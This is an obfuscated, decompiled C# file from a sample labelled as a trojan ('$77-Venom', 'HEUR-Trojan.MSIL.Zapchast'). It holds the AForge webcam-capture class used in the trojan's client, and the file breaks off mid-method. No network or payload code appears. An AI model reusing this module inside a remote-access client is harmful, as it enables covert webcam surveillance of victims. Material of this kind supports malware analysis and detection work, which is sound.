// Decompiled with JetBrains decompiler
// Type: xClient.Core.AForge.Video.DirectShow.VideoCaptureDevice
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.AForge.Video.DirectShow.Internals;

namespace xClient.Core.AForge.Video.DirectShow
{
  public class VideoCaptureDevice : 㑟謱廔\uF7AD푮㠝მ\uFFFD衄Ռ냲\uFB45휇\uA673䮱鲏솜너㜺殌
  {
    private string deviceMoniker;
    private int framesReceived;
    private long bytesReceived;
    private 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 videoResolution;
    private 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 snapshotResolution;
    private bool provideSnapshots;
    private Thread thread;
    private ManualResetEvent stopEvent;
    private 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[] videoCapabilities;
    private 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[] snapshotCapabilities;
    private bool needToSetVideoInput;
    private bool needToSimulateTrigger;
    private bool needToDisplayPropertyPage;
    private bool needToDisplayCrossBarPropertyPage;
    private IntPtr parentWindowForPropertyPage = IntPtr.Zero;
    private object sourceObject;
    private DateTime startTime;
    private object sync = new object();
    private bool? isCrossbarAvailable;
    private 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[] crossbarVideoInputs;
    private 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉 crossbarVideoInput = 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉.Default;
    private static Dictionary<string, 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]> cacheVideoCapabilities = new Dictionary<string, 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]>();
    private static Dictionary<string, 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]> cacheSnapshotCapabilities = new Dictionary<string, 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]>();
    private static Dictionary<string, 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[]> cacheCrossbarVideoInputs = new Dictionary<string, 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[]>();

    public 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉 CrossbarVideoInput
    {
      get => this.crossbarVideoInput;
      set
      {
        this.needToSetVideoInput = true;
        this.crossbarVideoInput = value;
      }
    }

    public 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[] AvailableCrossbarVideoInputs
    {
      get
      {
        if (this.crossbarVideoInputs == null)
        {
          lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
                this.crossbarVideoInputs = VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
            }
          }
          if (this.crossbarVideoInputs == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.crossbarVideoInputs == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.crossbarVideoInputs == null ? new 䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[0] : this.crossbarVideoInputs;
      }
    }

    public bool ProvideSnapshots
    {
      get => this.provideSnapshots;
      set => this.provideSnapshots = value;
    }

    public event \u2049\uFFFD皨檍ᨕ\uF47A\uEBA3뵸鲑里㯝楴킆\uE41D\uE096ᬞˇ\uE5E9幺狘 NewFrame;

    public event \u2049\uFFFD皨檍ᨕ\uF47A\uEBA3뵸鲑里㯝楴킆\uE41D\uE096ᬞˇ\uE5E9幺狘 SnapshotFrame;

    public event 쑳믷켱訥겿꣦㗛序ᣖ赓\uE584\uF1D2෩\uD926\uDF19魜츆\uA9C4\uE323躼 VideoSourceError;

    public event Ꝣ俣᧙\uEE2Aዞヿ嫶\uF120ᆃ\uF4D1\uF87F\uE158袛\uF83D壝穠\u2FC7仁\uF52A䔹 PlayingFinished;

    public virtual string Source
    {
      get => this.deviceMoniker;
      set
      {
        this.deviceMoniker = value;
        this.videoCapabilities = (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]) null;
        this.snapshotCapabilities = (뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[]) null;
        this.crossbarVideoInputs = (䛍䠔舫鬳\uF39C\u2320\uFFFD眄෬\u2642챧펷ኲᬑ\uF72F䖉겭韝蠢귉[]) null;
        this.isCrossbarAvailable = new bool?();
      }
    }

    public int FramesReceived
    {
      get
      {
        int framesReceived = this.framesReceived;
        this.framesReceived = 0;
        return framesReceived;
      }
    }

    public long BytesReceived
    {
      get
      {
        long bytesReceived = this.bytesReceived;
        this.bytesReceived = 0L;
        return bytesReceived;
      }
    }

    public bool IsRunning
    {
      get
      {
        if (this.thread != null)
        {
          if (!this.thread.Join(0))
            return true;
          this.Free();
        }
        return false;
      }
    }

    [Obsolete]
    public Size DesiredFrameSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public Size DesiredSnapshotSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public int DesiredFrameRate
    {
      get => 0;
      set
      {
      }
    }

    public 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 VideoResolution
    {
      get => this.videoResolution;
      set => this.videoResolution = value;
    }

    public 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售 SnapshotResolution
    {
      get => this.snapshotResolution;
      set => this.snapshotResolution = value;
    }

    public 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[] VideoCapabilities
    {
      get
      {
        if (this.videoCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheVideoCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
                this.videoCapabilities = VideoCaptureDevice.cacheVideoCapabilities[this.deviceMoniker];
            }
          }
          if (this.videoCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.videoCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.videoCapabilities == null ? new 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[0] : this.videoCapabilities;
      }
    }

    public 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[] SnapshotCapabilities
    {
      get
      {
        if (this.snapshotCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheSnapshotCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
                this.snapshotCapabilities = VideoCaptureDevice.cacheSnapshotCapabilities[this.deviceMoniker];
            }
          }
          if (this.snapshotCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.snapshotCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.snapshotCapabilities == null ? new 뗦邔沖逌僋䌛\uEE2F궍\uFFE0팰鋔\uF0D6ᄲ\uFFFD䳲惽ဃ\uE6A3ḧ售[0] : this.snapshotCapabilities;
      }
    }

    public object SourceObject => this.sourceObject;

    public VideoCaptureDevice()
    {
    }

    public VideoCaptureDevice(string deviceMoniker) => this.deviceMoniker = deviceMoniker;

    public void Start()
    {
      if (this.IsRunning)
        return;
      if (string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      this.framesReceived = 0;
      this.bytesReceived = 0L;
      this.isCrossbarAvailable = new bool?();
      this.needToSetVideoInput = true;
      this.stopEvent = new ManualResetEvent(false);
      lock (this.sync)
      {
        this.thread = new Thread(new ThreadStart(this.WorkerThread));
        this.thread.Name = this.deviceMoniker;
        this.thread.Start();
      }
    }

    public void SignalToStop()
    {
      if (this.thread == null)
        return;
      this.stopEvent.Set();
    }

    public void WaitForStop()
    {
      if (this.thread == null)
        return;
      this.thread.Join();
      this.Free();
    }

    public void Stop()
    {
      if (!this.IsRunning)
        return;
      this.thread.Abort();
      this.WaitForStop();
    }

    private void Free()
    {
      this.thread = (Thread) null;
      this.stopEvent.Close();
      this.stopEvent = (ManualResetEvent) null;
    }

    public void DisplayPropertyPage(IntPtr parentWindow)
    {
      if (this.deviceMoniker == null || this.deviceMoniker == string.Empty)
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        if (this.IsRunning)
        {
          this.parentWindowForPropertyPage = parentWindow;
          this.needToDisplayPropertyPage = true;
        }
        else
        {
          object filter;
          try
          {
            filter = FilterInfo.CreateFilter(this.deviceMoniker);
          }
          catch
          {
            throw new ApplicationException("Failed creating device object for moniker.");
          }
          if (!(filter is \uEC01Ⲩ鶉\u3193惔ᶰ똶\uED9C걻뜙\uFFFD턢\uF286\uFFFD紙椥獽쪛뿤惴))
            throw new NotSupportedException("The video source does not support configuration property page.");
          this.DisplayPropertyPage(parentWindow, filter);
          Marshal.ReleaseComObject(filter);
        }
      }
    }

    public void DisplayCrossbarPropertyPage(IntPtr parentWindow)
    {
      lock (this.sync)
      {
        for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue && this.IsRunning; ++index)
          Thread.Sleep(10);
        if (!this.IsRunning || !this.isCrossbarAvailable.HasValue)
          throw new ApplicationException("The video source must be running in order to display crossbar property page.");
        if (!this.isCrossbarAvailable.Value)
          throw new NotSupportedException("Crossbar configuration is not supported by currently running video source.");
        this.parentWindowForPropertyPage = parentWindow;
        this.needToDisplayCrossBarPropertyPage = true;
      }
    }

    public bool CheckIfCrossbarAvailable()
    {
      lock (this.sync)
      {
        if (!this.isCrossbarAvailable.HasValue)
        {
          if (!this.IsRunning)
          {
            this.WorkerThread(false);
          }
          else
          {
            for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue; ++index)
              Thread.Sleep(10);
          }
        }
        return this.isCrossbarAvailable.HasValue && this.isCrossbarAvailable.Value;
      }
    }

    public void SimulateTrigger() => this.needToSimulateTrigger = true;

    public bool SetCameraProperty(
      უ\u3003ᄋ堖䐪撋\u222E崝诰븏ྼ梁悔㓁ṷ\uE816㼮旌\u0380\uF2AF property,
      int value,
      व儭䵼ꨤ㿃䊆㿔\uFBB8硇㢺䵘녝\u2F81ᕎ\uEFB8홚尝\u0C8Dꝑ눊 controlFlags)
    {
      bool flag = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨))
          throw new NotSupportedException("The video source does not support camera control.");
        flag = ((鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨) filter).Set(property, value, controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return flag;
    }

    public bool GetCameraProperty(
      უ\u3003ᄋ堖䐪撋\u222E崝诰븏ྼ梁悔㓁ṷ\uE816㼮旌\u0380\uF2AF property,
      out int value,
      out व儭䵼ꨤ㿃䊆㿔\uFBB8硇㢺䵘녝\u2F81ᕎ\uEFB8홚尝\u0C8Dꝑ눊 controlFlags)
    {
      bool cameraProperty = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraProperty = ((鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨) filter).Get(property, out value, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraProperty;
    }

    public bool GetCameraPropertyRange(
      უ\u3003ᄋ堖䐪撋\u222E崝诰븏ྼ梁悔㓁ṷ\uE816㼮旌\u0380\uF2AF property,
      out int minValue,
      out int maxValue,
      out int stepSize,
      out int defaultValue,
      out व儭䵼ꨤ㿃䊆㿔\uFBB8硇㢺䵘녝\u2F81ᕎ\uEFB8홚尝\u0C8Dꝑ눊 controlFlags)
    {
      bool cameraPropertyRange = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraPropertyRange = ((鋂鷸\u2104펯\uFFFD\uE4B2䑴\uFFFD届嬴쬆벿\uFFFD赗\uA8C7㶪䛅ዢᔁ섨) filter).GetRange(property, out minValue, out maxValue, out stepSize, out defaultValue, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraPropertyRange;
    }

    private void WorkerThread() => this.WorkerThread(true);

    private void WorkerThread(bool runGraph)
    {
      \u9FE7覀鈳Ᵹᖋ퇐쐩\u2103ￕ毢蛠뮅궀诿賶뷃屇\u00A2\uF724뫀 reason = \u9FE7覀鈳Ᵹᖋ퇐쐩\u2103ￕ毢蛠뮅궀诿賶뷃屇\u00A2\uF724뫀.\u29C4ᮦ렾\u2F71ﴍ눨\u10CCᠧᖛ䊅Ơ벳檶㹷ꨒ怈\uE667र\uE9F7尀;
      bool flag = false;
      VideoCaptureDevice.Grabber callback1 = new VideoCaptureDevice.Grabber(this, false);
      VideoCaptureDevice.Grabber callback2 = new VideoCaptureDevice.Grabber(this, true);
      object o1 = (object) null;
      object o2 = (object) null;
      object o3 = (object) null;
      object o4 = (object) null;
      object retInterface = (object) null;
      塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕 塲ꩴ䲘钌Ⰾ噅ឩ攕Ⅾ筌땄鷭嶰늀ᖩ渕 = (塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕) null;
      \u0A0C캤銬椱\u2FF5\uFFFD\uE562峭\uAB1D㚼ⴖ\uFFFD\uFFFD꺾ᢉ\uEE96鴰慈뱄ꗏ 캤銬椱峭㚼ⴖ꺾ᢉ鴰慈뱄ꗏ = (\u0A0C캤銬椱\u2FF5\uFFFD\uE562峭\uAB1D㚼ⴖ\uFFFD\uFFFD꺾ᢉ\uEE96鴰慈뱄ꗏ) null;
      鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙1 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
      鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙2 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
      鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙3 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) null;
      雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD 雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿1 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) null;
      雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD 雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿2 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) null;
      範蒂柆懭댵藪\uE158덇뫽쭧즉\uE34E\u0383뺱ጪഥፀಡ쵮뒌 範蒂柆懭댵藪덇뫽쭧즉뺱ጪഥፀಡ쵮뒌1 = (範蒂柆懭댵藪\uE158덇뫽쭧즉\uE34E\u0383뺱ጪഥፀಡ쵮뒌) null;
      懨鶧\uF31B鲹嫴\u0E6F\u21E5檇ꗥ潒㤖镜\uF009嗍ꘫ㜷洶\u2869鱪\uF6D2 懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪 = (懨鶧\uF31B鲹嫴\u0E6F\u21E5檇ꗥ潒㤖镜\uF009嗍ꘫ㜷洶\u2869鱪\uF6D2) null;
      ὧ\u228A\u2B9B픝瓃下㺱歐ꈬ犂\uF559褺\u337F崡\uE4EE陵\u0F3D楄ꁏ\uE32E ὧ픝瓃下㺱歐ꈬ犂褺崡陵楄ꁏ1 = (ὧ\u228A\u2B9B픝瓃下㺱歐ꈬ犂\uF559褺\u337F崡\uE4EE陵\u0F3D楄ꁏ\uE32E) null;
      ﭠკ焸荬\uF756\uF12D縻䨟\uE752ﻜ넬翭ਈ妩୪깼귋盫쩉㷬 pin = (ﭠკ焸荬\uF756\uF12D縻䨟\uE752ﻜ넬翭ਈ妩୪깼귋盫쩉㷬) null;
      ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125 ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡 = (ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125) null;
      try
      {
        Type typeFromClsid1 = Type.GetTypeFromCLSID(\u2484灦ὠ\uE786賬\uA8DB\u0B04視\u17D8沂눑墅Ꞵ谟垵䔛꣥뻷\u2FD7䬗.횊\uFFFD嫦抐蒧퐑婧\u2F45䄑ﴱ櫣眐䃎\uEADE暖햻䤨롊\uF61E䖲);
        o1 = !(typeFromClsid1 == (Type) null) ? Activator.CreateInstance(typeFromClsid1) : throw new ApplicationException("Failed creating capture graph builder");
        塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕 graphBuilder1 = (塲ꩴ䲘\uF8E8钌Ⰾ噅\uFFFDឩ攕\u02C2ⅾ筌땄\uF510鷭嶰늀ᖩ渕) o1;
        Type typeFromClsid2 = Type.GetTypeFromCLSID(\u2484灦ὠ\uE786賬\uA8DB\u0B04視\u17D8沂눑墅Ꞵ谟垵䔛꣥뻷\u2FD7䬗.옋ꯎĔ\uFE30\uEE9E爰ᐱ既韞\uFFFD缸ᗡ魬끙떖윑굟压\u197E祐);
        o2 = !(typeFromClsid2 == (Type) null) ? Activator.CreateInstance(typeFromClsid2) : throw new ApplicationException("Failed creating filter graph");
        \u0A0C캤銬椱\u2FF5\uFFFD\uE562峭\uAB1D㚼ⴖ\uFFFD\uFFFD꺾ᢉ\uEE96鴰慈뱄ꗏ graphBuilder2 = (\u0A0C캤銬椱\u2FF5\uFFFD\uE562峭\uAB1D㚼ⴖ\uFFFD\uFFFD꺾ᢉ\uEE96鴰慈뱄ꗏ) o2;
        graphBuilder1.SetFiltergraph((㬿禅䢨\uF7C4瑌ཤ谶ᚎ㨀\u2604\u2695壇歝浻漻勭쏥섅\uF0FF펦) graphBuilder2);
        this.sourceObject = FilterInfo.CreateFilter(this.deviceMoniker);
        鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4 = this.sourceObject != null ? (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) this.sourceObject : throw new ApplicationException("Failed creating device object for moniker");
        try
        {
          懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪 = (懨鶧\uF31B鲹嫴\u0E6F\u21E5檇ꗥ潒㤖镜\uF009嗍ꘫ㜷洶\u2869鱪\uF6D2) this.sourceObject;
        }
        catch
        {
        }
        Type typeFromClsid3 = Type.GetTypeFromCLSID(\u2484灦ὠ\uE786賬\uA8DB\u0B04視\u17D8沂눑墅Ꞵ谟垵䔛꣥뻷\u2FD7䬗.䗔\u0D98۲\uF470ᬕG䯞䄱堖爎\uE38Cﭔ虢溃릤鞧묥\uF66E䅶랼);
        o3 = !(typeFromClsid3 == (Type) null) ? Activator.CreateInstance(typeFromClsid3) : throw new ApplicationException("Failed creating sample grabber");
        雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD 雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) o3;
        鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙5 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) o3;
        o4 = Activator.CreateInstance(typeFromClsid3);
        雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD 雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4 = (雏潃䏼냈ᚎ琢\u25BB涶矏þ㸊禳䪚뗢\uD8CF\uDC61갦\u3241㥿\uFFFD) o4;
        鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙6 = (鼦硗ꉪﭛ湏瘊䦽\uF630\uE04D㓾ﭺ㯷\u2F74램缨婾\u1C88ꇦ渙\uE355) o4;
        graphBuilder2.AddFilter(鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, "source");
        graphBuilder2.AddFilter(鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙5, "grabber_video");
        graphBuilder2.AddFilter(鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙6, "grabber_snapshot");
        AMMediaType mediaType = new AMMediaType();
        mediaType.MajorType = \uE15A䤑ӷꞭ俎ᢝ뾪榐\uEEA8\uE92E茋\uF2C1\uF7CF\uE90C\uF335㿂ᇍ贔윳긠.ꐌꔕ䰣\uAA5A\uF13B恣䆯ꉱ鬋뮼\uEA64ᴵ鐰\uFFFD聋ኝ㻐\uFFC0븂鉶;
        mediaType.SubType = \u26A6⃪ᄡ畀ᚣ嘔ԫ\u29E2\u27B9䤢樿\uFFFD퍶\uF1BF\u26F6펦杒忢\u08D0槈.푷䂜䁒鯹\uFFFD帾犃忀青\uEC79\uE124킧\u2F9F筭僌窼櫔鉍䄍\u0708;
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3.SetMediaType(mediaType);
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4.SetMediaType(mediaType);
        graphBuilder1.FindInterface(唴盝\u196F媸겓ﷶ壧笙灨䵽䫜듎\uE688맵ᰌ슡兕ᾁ땧涾.ⲍ䮾ㄐ\uE27C랭\u322Fﭩ老讥斝㹗ུ嗎쇮뷹ꐓକ뵦촴垀, Guid.Empty, 鼦硗ꉪﭛ湏瘊䦽㓾ﭺ㯷램缨婾ꇦ渙4, typeof (ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125).GUID, out retInterface);
        if (retInterface != null)
          ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡 = (ሙﶶ掝䢗礤䱳\uF19B걖콐勍铧뚟ᜊဤ챖瘼냥갡\u237B\u2125) retInterface;
        this.isCrossbarAvailable = new bool?(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡 != null);
        this.crossbarVideoInputs = this.ColletCrossbarVideoInputs(ሙﶶ掝䢗礤䱳걖콐勍铧뚟ᜊဤ챖瘼냥갡);
        if (懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪 != null)
        {
          graphBuilder1.FindPin(this.sourceObject, 䬟ﳂ缃ᖲ鹓\u2F20汧蛖\uFFFD㦪ᶶ齾ꉄᇀ嫒櫑뿕䇗\u2735툯.싏镴킼櫳䶘侥\uF47Aད묐襋諰㽄ォｷ펃썻\uF0CFꤥ걂\u24A4, ꑵ䃣苝塽亳刿\u2B69\uEAA5\u26DA䈴醣敨꽾췩菱䯯\u0E70\uFFFD왠덯.蚰ꩼԷힿ늝旷穃\uE625谍혏籲㯺遉אּ뮩㘯쫓ퟁ岕鲆, \uE15A䤑ӷꞭ俎ᢝ뾪榐\uEEA8\uE92E茋\uF2C1\uF7CF\uE90C\uF335㿂ᇍ贔윳긠.ꐌꔕ䰣\uAA5A\uF13B恣䆯ꉱ鬋뮼\uEA64ᴵ鐰\uFFFD聋ኝ㻐\uFFC0븂鉶, false, 0, out pin);
          if (pin != null)
          {
            찂\uE54C\u33D7ഁ䥺䞬뭍슌\uF46C㽹ᶱᜱ㡖堄\uE50B䉋䑙韃\u227A\u12C7 flags;
            懨鶧鲹嫴檇ꗥ潒㤖镜嗍ꘫ㜷洶鱪.GetCaps(pin, out flags);
            flag = (flags & 찂\uE54C\u33D7ഁ䥺䞬뭍슌\uF46C㽹ᶱᜱ㡖堄\uE50B䉋䑙韃\u227A\u12C7.襵Ү冿\uE924懙榪\uF5C1췽ኳ\u2BC5뛙㮿퍣奫䵎岟\u2CE6ꭇ懖\uEB8F) != 0;
          }
        }
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3.SetBufferSamples(false);
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3.SetOneShot(false);
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿3.SetCallback((㪍ᛕ虄\u3221ﾨᨋ뮽盦ᘕ뢒\uA7E4\uF824\uFFFD娭羊ꊂ䚩ⵝႨ뤏) callback1, 1);
        雏潃䏼냈ᚎ琢涶矏þ㸊禳䪚뗢갦㥿4.SetBufferSamples(true);
